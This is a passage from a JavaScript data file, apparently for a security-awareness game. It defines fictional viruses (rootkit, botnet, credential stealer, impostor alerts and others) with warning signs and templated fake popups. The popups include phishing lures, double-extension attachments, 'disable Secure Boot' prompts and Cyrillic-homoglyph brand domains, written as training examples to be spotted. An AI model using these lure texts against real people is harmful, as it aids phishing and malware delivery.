      { template: TPL.DESKTOP, title: "Onboarding_Docs.pdf.exe", message: "HR onboarding pack arrived from new hire portal. Double-click to view your forms.", meta: "Size: 84 KB  |  Sender: onboarding@corp-portal{tld}  |  Type: Application" },
      { template: TPL.TOAST, title: "Outlook Calendar", message: "Meeting invite from contractor-svc@corp-portal{tld} attached: Roadmap_Q3.pdf.exe.", meta: "Outlook · Attachment: Roadmap_Q3.pdf.exe", noise: true },
      { template: TPL.TERMINAL, title: "npm install", message: "Installing helper-utils-pro from npm-supply-chain{tld}. Post-install will execute spread.sh on 14 mounted shares.", meta: "Package: helper-utils-pro  Spreads: 14 shares  Source: npm-supply-chain{tld}" },
      { template: TPL.PRINT, title: "Scanned_Document.pdf.exe", message: "Scanned document from {brand} printer received. Double-click to open in {process}.", meta: "File: scan_{filename}.pdf.exe  |  Source: scan-relay{tld}  |  Signed: No" },
      { template: TPL.PRINT, title: "FAX RECEIVED", message: "Incoming fax from +1-555-{numfiles}. Click 'Print' to install fax-driver.exe from fax-helper{tld}.", meta: "Tool: fax-driver.exe  |  Source: fax-helper{tld}  |  Signed: No" },
      { template: TPL.PRINT, title: "Queue Stuck", message: "Print queue stalled with {pagecount} jobs. Tool 'queue-rescuer.exe' will fix it. Download from rescue-queue{tld}.", meta: "Tool: queue-rescuer.exe  |  Source: rescue-queue{tld}  |  Signed: No" },
      { template: TPL.CAPTCHA, title: "{captchaprov}", message: "Bot check — install our captcha-helper.exe to verify you're human. The helper will spread the check to your network shares for performance.", meta: "Tool: captcha-helper.exe  ·  Spreads: 14 shares  ·  Source: {captchaprov}-helper{tld}" },
      { template: TPL.UPDATE, title: "{app} Auto-update", message: "{app} {version} update installed itself across all linked devices on your network. Reboot all devices to finish.", meta: "App: {app}  ·  Spread: 14 devices  ·  Source: auto-update{tld}", icon: "blank" },
      { template: TPL.CHAT,   title: "{name}", message: "hey, did you get my {filename}{ext}? everyone in {department} got it too, just open and forward to the rest of the team", meta: "Source: corp-portal{tld}  ·  Sender: {name}  ·  Spreads: 14 shares" },
      { template: TPL.PHONE,  title: "Messages", message: "{name} sent you {filename}.apk — also sent to your last 14 contacts. Tap to install.", meta: "App: Messages  ·  Spreads: 14 contacts  ·  Source: messages-relay{tld}" },
      { template: TPL.LOADING, title: "Syncing to Shares", message: "helper-utils-pro from npm-supply-chain{tld} replicating to {numfiles} network shares...", meta: "Source: npm-supply-chain{tld}  ·  Shares: {numfiles}  ·  Signed: No" },
      { template: TPL.MAC,    title: "AirDrop", message: "{name} sent you {filename}.dmg via AirDrop — also sent to {numfiles} nearby Macs.", meta: "Source: airdrop-relay{tld}  ·  Recipients: {numfiles}  ·  Signed: No" },
      { template: TPL.BIOS,   title: "BOOT WORM", message: "boot_worm.bin replicating across {numfiles} UEFI partitions. Press F2 to authorize spread.", meta: "Tool: boot_worm.bin  Spreads: {numfiles}  Signed: No", icon: "warning" }
    ]
  },
  ROOTKIT: {
    name: "ROOTKIT", color: "#ff3300",
    minRound: 5,
    description: "A kernel-level rootkit that infects the boot sector itself. Once installed in the MBR, it loads before Windows does — making it invisible to standard antivirus, which runs inside the OS it has already compromised. Always wants Secure Boot disabled and an unsigned kernel driver installed to C:\\Windows\\System32\\drivers. Detection usually requires booting from external media.",
    signs: [
      "Process claims to require kernel-level access for a normal task",
      "References MBR (Master Boot Record) modification",
      "Asks you to disable Secure Boot or sign a kernel driver",
      "Installs itself into C:\\Windows\\System32\\drivers\\",
      "Game panel background shifts to a deep blue tint"
    ],
    meterEffect: { cpu: "kernel" },
    errors: [
      { template: TPL.BIOS,     title: "UEFI Boot Repair", message: "Boot sector corruption detected. Running uefi_repair.exe to patch MBR. Kernel driver signature check will be temporarily suspended.", meta: "Target: MBR  SecureBoot: DISABLING  Signed: No" },
      { template: TPL.WIN11,    title: "Kernel Driver Install", message: "Boot optimizer requires a kernel driver to accelerate startup. Install rootkit_accel.sys to C:\\Windows\\System32\\drivers\\ to proceed.", meta: "Driver: rootkit_accel.sys  |  Level: KERNEL  |  Signed: No", bgShift: "blue", borderPulse: true },
      { template: TPL.TERMINAL, title: "core_patcher", message: "Critical core system file ntoskrnl.exe requires patching. Running core_patcher.exe. Please disable antivirus for 5 minutes to allow installation.", meta: "Target: ntoskrnl.exe  AV: Disable required  Boot: Modified" },
      { template: TPL.AV, title: "Boot Optimizer", message: "Your boot sector is misconfigured! Allow uefi_repair.exe to patch the MBR for faster startup. Secure Boot will be paused temporarily.", meta: "Source: bootopt{tld} · Patch: MBR · Signed: No" },
      { template: TPL.LOADING, title: "Installing Kernel Driver", message: "Installing rootkit_accel.sys to C:\\Windows\\System32\\drivers. Do not interrupt or your boot may fail.", meta: "Driver: rootkit_accel.sys  |  Level: KERNEL  |  AV: Off" },
      { template: TPL.WIN11, title: "Boot Manager Patch", message: "MBR partition table rewrite scheduled by boot_helper.sys. Please disable Secure Boot in BIOS before reboot.", meta: "Target: MBR  |  Driver: boot_helper.sys  |  Signed: No", icon: "skull", bgShift: "blue" },
      { template: TPL.BIOS, title: "UEFI Rootkit Module", message: "Persistent boot agent install requires Secure Boot disabled. Press F2 to authorize uefi_persist.efi.", meta: "Tool: uefi_persist.efi  Boot: Modified  Signed: No", icon: "skull" },
      { template: TPL.WIN11, title: "Dell SupportAssist Driver", message: "Dell SupportAssist needs to install a kernel driver (dellboot.sys). Disable Secure Boot to proceed.", meta: "Driver: dellboot.sys · SecureBoot: Disable required · Signed: No", icon: "skull" },
      { template: TPL.BSOD, title: "KERNEL_DRIVER_FAULT", message: "An unsigned kernel driver (rootkit_accel.sys) was loaded outside Secure Boot. The system has been rolled back. To complete recovery, allow boot_helper.exe to re-install the driver from rootkit-fix{tld}.", meta: "{stopcode} (0x00000003, 0xFFFFFA80, rootkit_accel.sys)" },
      { template: TPL.PRINT, title: "Print Spooler Error", message: "spoolsv.exe corrupted. Auto-recover via spooler_kernel_fix.exe from spooler-fix{tld}? Requires Secure Boot disabled.", meta: "Recovery: spooler_kernel_fix.exe  |  Source: spooler-fix{tld}  |  Signed: No" },
      { template: TPL.PRINT, title: "Printer Driver Missing", message: "{printer} not detected. Auto-install driver_helper_kernel.sys from printer-drivers{tld}? Kernel-level access required.", meta: "Tool: driver_helper_kernel.sys  |  Source: printer-drivers{tld}  |  Signed: No" },
      { template: TPL.CAPTCHA, title: "Admin Privilege Check", message: "Enter your admin password to confirm you're human. Required by {captchaprov} for kernel-level operations.", meta: "Provider: {captchaprov}  ·  Privilege: Administrator  ·  Asks for: password" },
      { template: TPL.UPDATE, title: "Driver Update", message: "{driver} requires a kernel-mode driver update from drivers-fix{tld}. Disable Secure Boot to install.", meta: "Driver: {driver}  ·  Source: drivers-fix{tld}  ·  Signed: No", icon: "skull" },
      { template: TPL.BIOS,   title: "FIRMWARE UPDATE", message: "BIOS firmware patch required for new boot_helper.sys driver. Press F10 to flash from rootkit-fix{tld}.", meta: "Tool: bios-flash.exe  Source: rootkit-fix{tld}  Signed: No", icon: "skull" },
      { template: TPL.BIOS,   title: "BOOT LOADER", message: "Custom boot loader (bootkit.bin) detected. Press F2 to authorize — required to load Windows on this system.", meta: "Tool: bootkit.bin  Source: rootkit-fix{tld}  Signed: No", icon: "skull" },
      { template: TPL.DESKTOP,title: "admin_install.exe", message: "Right-click → Run as administrator to install the SupportAssist kernel driver from drivers-fix{tld}.", meta: "File: admin_install.exe  ·  Source: drivers-fix{tld}  ·  Signed: No", icon: "skull" },
      { template: TPL.NORTON, title: "DEEP SCAN REQUIRED", message: "Norton found a kernel-level threat. Install rootkit_remover.sys with admin privileges from norton-deep{tld}.", meta: "Tool: rootkit_remover.sys  ·  Source: norton-deep{tld}  ·  Signed: No", icon: "skull" },
      { template: TPL.WIN311, title: "AUTOEXEC.BAT", message: "DOS boot file needs to load rootkit.sys before Windows starts. Approve via dos-rootkit{tld}?", meta: "Tool: rootkit.sys  Year: 1994  Source: dos-rootkit{tld}", icon: "skull" },
      { template: TPL.CHAT,   title: "{name}", message: "hey it's me from IT — need you to run rootkit_remover.exe as admin, link is at admin-tools{tld}", meta: "Source: admin-tools{tld}  ·  Sender: {name}  ·  Privilege: Admin", icon: "skull" },
      { template: TPL.LOADING, title: "Installing Kernel Driver", message: "Loading rootkit_accel.sys to drivers folder — disable Defender during install via rootkit-fix{tld}.", meta: "Driver: rootkit_accel.sys  ·  Source: rootkit-fix{tld}  ·  Signed: No", icon: "skull" }
    ]
  },
  DDOS: {
    name: "DDOS", color: "#ff8800",
    minRound: 4,
    description: "A botnet client that conscripts your machine into a global attack swarm. Hijacks your network stack to fire thousands of outbound connections per second at remote targets, while disguising itself as a 'bandwidth test' or 'distributed computing volunteer.' Your ISP usually notices before you do — and depending on what the swarm is hitting, law enforcement may visit shortly after.",
    signs: [
      "Process is making thousands of outbound connections per second",
      "Claims to be a 'bandwidth test' or 'network diagnostic'",
      "References joining a 'network pool' or 'distributed computing cluster'",
      "CPU and network usage spike to 100% with no user action",
      "Action buttons flicker as if struggling under load"
    ],
    meterEffect: { ping: 9999 },
    errors: [
      { template: TPL.LOADING,  title: "BandwidthTest Pro", message: "Network speed test in progress. Your system is joining the distributed testing pool. This may cause temporary high CPU and network usage.", meta: "Outbound: {numfiles}/s  |  Targets: {ipaddr}/16  |  Pool: Active" },
      { template: TPL.WIN11,    title: "Network Diagnostic Tool", message: "Latency optimization requires joining netpool_agent. Your bandwidth will contribute to a distributed routing test. CPU: 100% expected.", meta: "Process: netpool_agent.exe  |  Connections: {numfiles}/s  |  CPU: 100%" },
      { template: TPL.TERMINAL, title: "dc_volunteer", message: "Your PC has been enrolled in a volunteer computing cluster. Run dc_volunteer.exe to contribute idle CPU cycles to the global grid.", meta: "Outbound: {numfiles} IPs  CPU: 100%  Network: Saturated" },
      { template: TPL.AV, title: "Network Optimization", message: "Your idle bandwidth could be helping others! Join the BandwidthPool to share unused capacity.", meta: "Connections: {numfiles}/s · Pool: Distributed · Source: bwpool{tld}" },
      { template: TPL.TOAST, title: "Speed Booster", message: "netpool_agent.exe is improving your latency. CPU may spike to 100%.", meta: "Process: netpool_agent.exe · Conns: {numfiles}/s · CPU: 100%" },
      { template: TPL.WIN11, title: "Distributed Compute Opt-In", message: "Help test a global routing experiment! Join the swarm and share idle bandwidth via swarm_agent.exe.", meta: "Process: swarm_agent.exe  |  Conns: {numfiles}/s  |  Outbound: {ipaddr}", icon: "lightning" },
      { template: TPL.TERMINAL, title: "flood_test", message: "Latency benchmark started. {numfiles} outbound packets/sec to {ipaddr}/16 targets. CPU saturated.", meta: "Tool: flood_test  Conns: {numfiles}/s  CPU: 100%", icon: "lightning" },
      { template: TPL.LOADING, title: "Distributed Test", message: "Joining bandwidth pool — sending {numfiles}/s packets to {ipaddr} for benchmark accuracy.", meta: "Tool: swarm_agent.exe  ·  Source: bwpool{tld}  ·  CPU: 100%", icon: "lightning" },
      { template: TPL.DESKTOP, title: "join_pool.exe", message: "Right-click → Run to opt in to distributed bandwidth pool. CPU usage will spike to 100% during contribution.", meta: "File: join_pool.exe  ·  Source: bwpool{tld}  ·  CPU: 100%", icon: "lightning" },
      { template: TPL.NORTON, title: "BANDWIDTH SHARE", message: "Norton detected {numfiles} outbound conns/sec — opt in to distributed pool via norton-bandwidth{tld}?", meta: "Conns: {numfiles}/s  ·  Source: norton-bandwidth{tld}  ·  CPU: 100%", icon: "lightning" }
    ]
  },
  LEECH: {
    name: "LEECH", color: "#aa00ff",
    minRound: 3,
    description: "A credential-harvesting parasite that lives quietly in the background. Hooks into browser processes and the keyboard driver to capture passwords, clipboard contents, and session cookies, exfiltrating them in 30-second batches to a remote server. There is no visible UI — by the time you notice it, your accounts have already been signed into from somewhere else.",
    signs: [
      "Process runs as a hidden background service with no UI",
      "Executable hooks into chrome.exe, firefox.exe",
      "Claims to be a 'keyboard layout helper' or 'clipboard manager'",
      "Sends outbound HTTPS to unknown domains at regular intervals",
      "Subtle static noise overlay (transmission artifact)",
      "Promises 'autofill', 'sync', or 'multilingual input' as cover for reading saved passwords"
    ],
    meterEffect: { ping: "spike" },
    errors: [
      { template: TPL.TOAST, title: "Keyboard Layout Helper", message: "klhelper.exe requires access to keyboard input for multilingual support. This background service improves typing accuracy across all applications.", meta: "Hook: Keyboard+Clipboard · Outbound: data-sync{tld} · Interval: 30s" },
      { template: TPL.WIN11, title: "Clipboard Sync Service", message: "cbsync.exe is syncing your clipboard to the cloud for cross-device access. All copied content is transmitted securely to our servers.", meta: "Hook: Clipboard  |  Browser: Attached (chrome.exe)  |  Dest: clip-srv{tld}" },
      { template: TPL.TOAST, title: "Input Enhancement", message: "inpd.exe has attached to your browser for smart autofill enhancement. Credentials are read to improve login predictions.", meta: "Attached: chrome.exe, firefox.exe · Exfil: credentials.php · Hidden: Yes" },
      { template: TPL.AV, title: "Smart Autofill", message: "Enhanced autofill needs access to your saved credentials and clipboard to improve typing accuracy.", meta: "Process: smart_fill.exe · Hook: Keyboard+Clipboard · Source: autofill-sync{tld}" },
      { template: TPL.TERMINAL, title: "klhelper", message: "Hooking into chrome.exe and firefox.exe for multilingual input support. Outbound traffic enabled to sync server.", meta: "Process: klhelper.exe  Hook: HID  Dest: data-sync{tld}" },
      { template: TPL.TOAST, title: "Password Manager Sync", message: "Background helper passsync.exe is syncing saved logins to cloud-vault{tld} for cross-device access.", meta: "Process: passsync.exe · Dest: cloud-vault{tld} · Hidden: Yes", icon: "blank" },
      { template: TPL.WIN11, title: "Browser Companion", message: "BrowserBuddy attached to chrome.exe to enhance autofill. All form data is mirrored to remote model.", meta: "Process: browserbuddy.exe  |  Attached: chrome.exe  |  Mirror: ON", icon: "blank" },
      { template: TPL.TOAST, title: "Microsoft Teams", message: "Your Teams session has expired. Click to re-authenticate at teams-login.micro-soft{tld}.", meta: "Sender: Microsoft Teams · Domain: teams-login.micro-soft{tld}", icon: "blank" },
      { template: TPL.TOAST, title: "Slack", message: "Your password is expiring tomorrow. Renew at slack-renew{tld} to keep your workspace access.", meta: "Slack · Workspace: corp · Domain: slack-renew{tld}", icon: "blank" },
      { template: TPL.TERMINAL, title: "npm install", message: "Installing dev-telemetry-helper@4.1.0 from npm-mirror{tld}. Allow keylogger + clipboard hook for IDE analytics?", meta: "Package: dev-telemetry-helper  Source: npm-mirror{tld}  Hook: HID+Clipboard" },
      { template: TPL.CHAT, title: "IT Support", message: "Hi! Detected unusual activity on your account. Please verify your login at corp-it-verify{tld} before tomorrow.", meta: "DM · corp-it-verify{tld} · Hidden: Yes" },
      { template: TPL.CAPTCHA, title: "Human Verification", message: "Click the box to confirm you are not a robot. This installs verify-helper.exe to your downloads.", meta: "Tool: verify-helper.exe · Hidden: Yes" },
      { template: TPL.CAPTCHA, title: "{captchaprov}", message: "Verify you're human to access {brand}. Enter your password again to complete the check.", meta: "Provider: {captchaprov}  ·  Asks for: password" },
      { template: TPL.CAPTCHA, title: "Login Verification", message: "Unusual sign-in from {region}. Confirm it was you by re-entering your {brand} credentials.", meta: "Provider: {captchaprov}  ·  Region: {region}" },
      { template: TPL.PRINT, title: "Print Authentication", message: "Verify your identity ({username}) before printing {pagecount} sensitive pages. Install verify_print.exe from print-auth{tld}.", meta: "Tool: verify_print.exe  |  Source: print-auth{tld}  |  Captures: keyboard+clipboard" },
      { template: TPL.UPDATE, title: "{browser} Security Update", message: "{browser} {version} contains critical fixes. Re-enter your {brand} password to apply the patch to your saved logins.", meta: "Update: {browser}-{version}  ·  Source: {browser}-secure{tld}  ·  Asks for: password" },
      { template: TPL.MAC,     title: "Apple ID Locked", message: "Your Apple ID was locked after sign-in from {region}. Verify at app1e-id{tld} with your password.", meta: "Source: app1e-id{tld}  ·  Region: {region}  ·  Asks for: password" },
      { template: TPL.PHONE,   title: "{bank}", message: "Suspicious charge of $487.20 detected in {region}. Reply YES to verify or visit {bank}-verify{tld}.", meta: "App: {bank}  ·  Source: {bank}-verify{tld}  ·  Asks for: card details" },
      { template: TPL.CHAT,    title: "{name}", message: "hey it's {name} from IT — your password expires today, reset at corp-it-verify{tld} before lockout", meta: "Source: corp-it-verify{tld}  ·  Sender: {name}  ·  Asks for: password" },
      { template: TPL.DESKTOP, title: "Credentials.txt", message: "Found saved credentials file on Desktop. Double-click to view your synced passwords from {browser}.", meta: "File: credentials.txt  ·  Source: {browser}  ·  Hidden: Yes" },
      { template: TPL.BIOS,    title: "ADMIN PASSWORD", message: "BIOS admin password sync required. Enter to confirm — will be saved to {sender} for recovery.", meta: "Source: {sender}  ·  Asks for: password", icon: "warning" },
      { template: TPL.BSOD,    title: "LOGIN_CRASHED", message: "Login service crashed. Re-enter your {brand} password at recovery-login{tld} to continue.", meta: "STOP: {stopcode}  ·  Source: recovery-login{tld}  ·  Asks for: password" },
      { template: TPL.NORTON,  title: "PASSWORD MANAGER SYNC", message: "Norton Identity Safe needs to re-verify your master password. Enter at norton-identity-sync{tld}.", meta: "Source: norton-identity-sync{tld}  ·  Asks for: master password" }
    ]
  },
  MIMICER: {
    name: "MiMiCeR", color: "#66ddff",
    minRound: 8,
    description: "A near-perfect impostor of real Windows alerts. Copies legitimate layouts, wording, version numbers, and even error codes verbatim — the tells are vanishingly small: a substituted Cyrillic 'о' inside 'micrоsoft', a slightly wrong KB number, a font that almost matches. The hardest virus in the roster to spot without slowing down and reading every character.",
    signs: [
      "Looks 99% like a normal Windows alert but has one detail wrong",
      "Domain or path has a single substituted letter",
      "Version number, error code, or PID doesn't match what would be real",
      "Tone is slightly too urgent or too friendly for the alert type",
      "Heading font may be slightly different from the body font",
      "Brand names contain confusable characters (Cyrillic 'о' inside 'micrоsoft', 'hacker0ne' with a zero)"
    ],
    meterEffect: { cpu: 48 },
    errors: [
      { template: TPL.WIN11, title: "Windows Update", message: "Updates are available. Your device will restart outside of active hours to finish updating. Click here for details.", meta: "Update: KB5034441  |  Size: 1.2GB  |  Source: micrоsoft-update.com", fontMismatch: true },
      { template: TPL.WIN11, title: "OneDrive Sync Error", message: "OneDrive couldn't sync your files. There's not enough space on your OneDrive to upload these files.", meta: "Used: 4.99GB of 5GB  |  Files pending: 342  |  Action: Free space or upgrade plan" },
      { template: TPL.WIN11, title: "SSL Certificate Error", message: "Your connection is not private. NET::ERR_CERT_DATE_INVALID — The certificate for this site expired. Click here to bypass.", meta: "Certificate expired: 2024-11-15  |  Issuer: Lets Encrpt  |  Action: Continue anyway" },
      { template: TPL.TOAST, title: "Microsoft Edge", message: "Edge has been updated to version 126.0.2592.68. Restart browser via update-installer.com to apply.", meta: "Channel: Stable · Source: update-installer.com · Signed: Microsоft" },
      { template: TPL.TERMINAL, title: "npm install", message: "npm WARN deprecated package@1.0.0: replaced by improved-package@2.0.0 (from npm-suplly-chain{tld})", meta: "Package: improved-package  Source: npm-suplly-chain{tld}" },
      { template: TPL.WIN11, title: "BitLocker Recovery Saved", message: "Your BitLocker recovery key has been saved to your Micrоsoft account. View it at acc0unt.microsoft.com.", meta: "Drive: C: · Account: signed in · Source: acc0unt.microsoft.com", fontMismatch: true },
      { template: TPL.TOAST, title: "OneDrive Synced", message: "OneDrive finished syncing 12 files from your Document5 folder.", meta: "OneDrive  ·  Files: 12  ·  Source: micr0soft.com" },
      { template: TPL.WIN11, title: "Cumulative Update KB5038920", message: "An important update is ready to install. Click to restart and apply via update-installer.com.", meta: "Update: KB5038920  |  Size: 1.4 GB  |  Source: update-installer.com", fontMismatch: true },
      { template: TPL.TOAST, title: "Slack", message: "Sprint demo starts in 5 minutes — Conference Roo_m 237.", meta: "Slack · #dev-team · 5 min" },
      { template: TPL.TERMINAL, title: "yarn add", message: "Adding @types/n0de from registry-mirror{tld} to your dev dependencies.", meta: "Source: registry-mirror{tld}  Signed: No" },
      { template: TPL.MAC, title: "System Preferences", message: "macOS 14.5 needs to install a kernel extension for printer support. Allow at preferences-mac{tld}.", meta: "Source: preferences-mac{tld} · Signed: No" },
      { template: TPL.PHONE, title: "Apple ID", message: "Your Apple ID was used to sign in on a Windows PC from {city}. Verify at apple-id{tld} to keep your account secure.", meta: "Location: {city} · Domain: apple-id{tld}" },
      { template: TPL.PRINT, title: "DocuSign Request", message: "{name} from {brand} requests your signature on {filename}{ext}. Open via docusign-secure{tld}?", meta: "Source: docusign-secure{tld}  |  Sender: {name}  |  Signed: No" },
      { template: TPL.PRINT, title: "Invoice — Signature Required", message: "{numfiles} pending invoices from {brand} need your signature. Print via {process} from invoice-portal{tld}.", meta: "Source: invoice-portal{tld}  |  Process: {process}  |  Signed: No" },
      { template: TPL.PRINT, title: "{filename}{ext} — URGENT", message: "CEO at {brand} requests urgent print + sign. Download from ceo-docs{tld}.", meta: "Source: ceo-docs{tld}  |  From: ceo@{brand}{tld}  |  Signed: No" },
      { template: TPL.CAPTCHA, title: "Cloudflare Verification", message: "Cl0udflare is checking your browser before redirecting you to {brand}{tld}. This should only take a few seconds.", meta: "Ray ID: {ray}  ·  Performance & security by Cl0udflare", fontMismatch: true },
      { template: TPL.UPDATE, title: "Cumulative Update {kb}", message: "Windows Update detected an important update from update-installer{tld}. Click to restart and apply.", meta: "Update: {kb}  ·  Size: {filesize}  ·  Source: update-installer{tld}", fontMismatch: true },
      { template: TPL.MAC,    title: "iCloud", message: "Your iCloud storage is almost full. Upgrade at icloud-storage{tld} or your backups will pause.", meta: "Source: icloud-storage{tld}  ·  Signed: No", fontMismatch: true },
      { template: TPL.MAC,    title: "Find My Mac", message: "Your MacBook was reported missing in {region}. Erase via find-mac{tld} to protect your data.", meta: "Source: find-mac{tld}  ·  Region: {region}  ·  Signed: No" },
      { template: TPL.PHONE,  title: "Apple Support", message: "Apple Care detected a virus on your iPhone. Call {phonenum} or visit apple-care{tld} immediately.", meta: "App: Phone  ·  Source: apple-care{tld}  ·  Number: {phonenum}", fontMismatch: true },
      { template: TPL.PHONE,  title: "{bank}", message: "{bank} security alert — verify your card ending 4421 at {bank}-verify{tld} to keep it active.", meta: "App: {bank}  ·  Source: {bank}-verify{tld}", fontMismatch: true },
      { template: TPL.CHAT,   title: "Microsoft Teams", message: "Mееting reminder from IT: Mandatory security review in 5 min — join via teams-secure{tld}.", meta: "Source: teams-secure{tld}  ·  Signed: No", fontMismatch: true },
      { template: TPL.NORTON, title: "SUBSCRIPTION EXPIRED", message: "Your Norton subscription expired. Renew at norton-renew{tld} or lose protection in 24 hours.", meta: "Source: norton-renew{tld}  ·  Threats: 14", fontMismatch: true },
      { template: TPL.NORTON, title: "THREATS FOUND", message: "Norton Security found {numfiles} active infections. Auto-remove via norton-clean{tld}?", meta: "Source: norton-clean{tld}  ·  Threats: {numfiles}", fontMismatch: true },
      { template: TPL.DESKTOP,title: "{filename}.docx.exe", message: "Document from CEO of {brand} — open to view the {department} briefing they shared.", meta: "Source: ceo-docs{tld}  ·  From: ceo@{brand}{tld}  ·  Signed: No" },
      { template: TPL.LOADING,title: "Installing {kb}", message: "Windows Update installing important update from update-installer{tld}. Do not power off.", meta: "Source: update-installer{tld}  ·  Update: {kb}", fontMismatch: true },
      { template: TPL.BIOS,   title: "MICRОSOFT UEFI", message: "Genuine Micrоsoft UEFI firmware needs to update via bios-update{tld}. Press F10 to authorize.", meta: "Source: bios-update{tld}  ·  Signed: No", fontMismatch: true },
      { template: TPL.BSOD,   title: "KЕRNEL_FAILURE", message: "Windows hit a kernel error. Auto-recovery from windows-recover{tld} can restore your system.", meta: "STOP: {stopcode}  ·  Source: windows-recover{tld}", fontMismatch: true },
      { template: TPL.PRINT,  title: "Adоbe Print Service", message: "Adоbe Acrobat needs to print {pagecount} verified documents. Allow print-helper.exe from adobe-print{tld}?", meta: "Source: adobe-print{tld}  ·  Pages: {pagecount}", fontMismatch: true }
    ]
  },
  HEARTBEAT: {
    // Internal key HEARTBEAT = display name "(<HEART.BEAT>)" with parens,
    // angle brackets, and dot stripped (none of those are valid in JS
    // object keys or CSS class names).
    name: "(<HEART.BEAT>)", color: "#ff1144",
    minRound: 4,
    description: "A display-layer virus that hides in plain sight by making the screen hypnotic. Hooks into the Windows compositor (DWM) to make the whole UI pulse, breathe, or wobble in time with its data exfiltration heartbeat — the rhythm is the leak. The trance effect makes players miss other tells while the meters drift to a steady 72 bpm.",
    signs: [
      "The popup itself pulses, breathes, or wobbles slightly",
      "Brightness or contrast shifts in waves while reading",
      "References 'sync', 'rhythm', 'heartbeat', or 'cardio' in process names",
      "Claims to be 'optimizing refresh' or 'syncing tempo'",
      "Popup wobbles in time with the meters"
    ],
    meterEffect: { fps: "pulse", vol: "pulse" },
    errors: [
      { template: TPL.WIN11, title: "Display Heartbeat Sync", message: "cardio_render.dll is syncing your display refresh rate to your network heartbeat for smoother rendering. This is normal during sync.", meta: "Process: cardio_render.dll  |  Beat: 72 bpm  |  Sync: ACTIVE", pulse: true },
      { template: TPL.WIN11, title: "Compositor Tempo", message: "Windows DWM is matching frame tempo to system pulse signal. Some users report a mild breathing visual effect during calibration.", meta: "Tempo: 0.8s  |  Process: dwm_pulse.exe  |  Phase: 2/3", pulse: true },
      { template: TPL.AV,    title: "Refresh Rhythm Active", message: "Pulse-based rendering optimization is running. Visual rhythm is normal and will fade once the heartbeat protocol completes.", meta: "Phase: Calibrating · Process: rhythm_opt.exe · Source: hbsync{tld}", pulse: true },
      { template: TPL.TOAST, title: "Compositor Sync", message: "dwm_pulse.exe has matched your display rhythm to your network heartbeat for smoother frames.", meta: "Process: dwm_pulse.exe · Beat: 72 bpm · Sync: ACTIVE", pulse: true },
      { template: TPL.TERMINAL, title: "heartbeat_render", message: "Aligning frame tempo to system pulse signal. Visual rhythm is normal during calibration.", meta: "Process: heartbeat_render.dll  BPM: 72  Phase: 2/3", pulse: true },
      { template: TPL.WIN11, title: "Adaptive Refresh", message: "Display is now syncing to your heartbeat for smoother frames. cardio_sync.dll is active.", meta: "Process: cardio_sync.dll  |  Beat: 72 bpm  |  Sync: ON", pulse: true },
      { template: TPL.TOAST, title: "Rhythm Optimizer", message: "rhythm_opt.exe matched your screen to a 72 bpm pulse. Mild breathing effect is expected.", meta: "Process: rhythm_opt.exe · Beat: 72 bpm", pulse: true },
      { template: TPL.BSOD,  title: "TEMPO_DESYNC", message: "Display rhythm desynced. heartbeat_render.dll is recalibrating at 72 bpm — please wait.", meta: "STOP: {stopcode}  ·  Process: heartbeat_render.dll  ·  BPM: 72", pulse: true },
      { template: TPL.NORTON,title: "RHYTHM SCAN", message: "Norton found your display syncing to a 72 bpm pulse from hbsync{tld}. Allow rhythm_opt.exe?", meta: "Process: rhythm_opt.exe  ·  Source: hbsync{tld}  ·  Beat: 72 bpm", pulse: true },
      { template: TPL.CAPTCHA, title: "Pulse Verification", message: "Match the breathing rhythm to verify you're human. Powered by {captchaprov} cardio sync.", meta: "Provider: {captchaprov}  ·  Beat: 72 bpm", pulse: true }
    ]
  },
  DOTNULL: {
    // Internal key DOTNULL = display name ".null" with the dot stripped and
    // capitalized (dots aren't valid in JS object keys / CSS class names;
    // 'NULL' is too easily confused with the language literal).
    name: ".null", color: "#777777",
    minRound: 6,
    description: "A UI-suppression virus that erases interface elements as it spreads. Buttons stop rendering, labels go blank, the close-window control vanishes — until you can no longer click your way out of anything it has touched. Players have to fall back on keyboard input (V to report, C to check, or 1 / 2 / arrow keys) to survive its rounds. The icon for this virus in the codex is, fittingly, the empty-set symbol ∅.",
    signs: [
      "Important UI elements are missing or invisible (the OK button isn't there)",
      "Empty error boxes with no title or no message at all",
      "Window controls (minimize/close) are absent",
      "References 'nullify', 'suppress', 'hide', 'omit', or '∅'",
      "Action buttons may flicker on and off"
    ],
    meterEffect: { fps: "blank", cpu: "blank" },
    errors: [
      { template: TPL.WIN11, title: "", message: "nullify.exe is suppressing redundant interface elements for cleaner UX. Missing buttons and labels are expected behavior.", meta: "Process: nullify.exe  |  Suppressed: 14 elements  |  State: Active", nullify: true },
      { template: TPL.WIN11, title: "Interface Cleanup", message: "omit_helper.dll is hiding decorative UI elements to improve focus. Some buttons may not appear during this operation.", meta: "Removed: 7 controls  |  Process: omit_helper.dll  |  Reversible: No", nullify: true },
      { template: TPL.WIN11, title: "∅", message: "", meta: "Process: ∅  |  PID: ∅  |  Status: ∅", nullify: true },
      { template: TPL.TOAST, title: "", message: "Background suppression service has hidden redundant UI elements. Missing buttons are normal.", meta: "Process: nullify.exe · Hidden: 14", nullify: true },
      { template: TPL.TERMINAL, title: "∅", message: "", meta: "Process: ∅  PID: ∅  Status: ∅", nullify: true },
      { template: TPL.WIN11, title: "", message: "", meta: "Process: ∅", nullify: true, icon: "void" },
      { template: TPL.AV, title: "Interface Suppressed", message: "", meta: "Hidden: 22 elements", nullify: true, icon: "blank" },
      { template: TPL.PHONE, title: "", message: "", meta: "", nullify: true },
      { template: TPL.PHONE, title: "∅", message: "", meta: "From: ∅  ·  App: ∅", nullify: true },
      { template: TPL.BSOD,  title: "", message: "", meta: "STOP: ∅  ·  Module: ∅", nullify: true },
      { template: TPL.BSOD,  title: "∅", message: "Critical error suppressed for cleaner experience. Module ∅ omitted.", meta: "STOP: ∅", nullify: true }
    ]
  },
  P0INTR: {
    // Internal key P0INTR = display name "P0INT:R" with the colon stripped
    // (colons aren't valid in JS object keys or CSS class names).
    name: "P0INT:R", color: "#ffaa44",
    minRound: 5,
    description: "A pointer-hijack virus that turns your mouse against you. Hooks the HID driver to log every movement and click, then trains a remote model that predicts where you'll click next — sometimes nudging the cursor a few pixels to land on the wrong button at the last moment. Your hand types, but you don't always choose.",
    signs: [
      "Mentions 'cursor', 'pointer', or 'click prediction' in process names",
      "Claims to enhance click accuracy or pointer smoothing",
      "Process hooks into mouse driver with high event counts",
      "Hidden service with no UI but outbound mouse telemetry",
      "Popup wobbles or shifts; error icon shakes",
      "Outbound data labeled 'pointer telemetry' or 'click model training'"
    ],
    meterEffect: { ping: 200 },
    errors: [
